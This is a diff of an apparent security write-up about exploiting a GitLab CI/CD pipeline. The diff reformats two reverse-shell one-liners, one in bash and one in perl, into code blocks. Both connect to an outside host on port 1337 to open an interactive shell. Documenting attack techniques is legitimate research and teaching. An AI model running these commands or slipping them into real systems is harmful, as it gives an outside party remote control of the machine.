@@ -39,5 +39,13 @@ It performs the following three crucial functions:
 This is not strictly necessary (and not exactly difficult since we control the GitLab `.gitlab-ci.yml`), but a reverse shell makes it much easier to inspect the system and debug our exploitation efforts on the spot, instead of having to wait for the entire CI/CD pipeline to run through after every change.
 
 A quick reverse shell should be in the repertoire of every hacker.
-My personal favorite being a simple `sh -i >& /dev/tcp/feuermagier.com/1337 0>&1`, or alternatively with perl `perl -e 'use Socket;$i="feuermagier.com";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` in case the first one is making problems.
+My personal favorite being a simple:
+```bash
+sh -i >& /dev/tcp/feuermagier.com/1337 0>&1
+```
+Or alternatively with perl:
+```perl
+perl -e 'use Socket;$i="feuermagier.com";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+in case the first one is making problems.
 You'll be surprised by how many systems and minimalist dev-containers ship with perl installed.
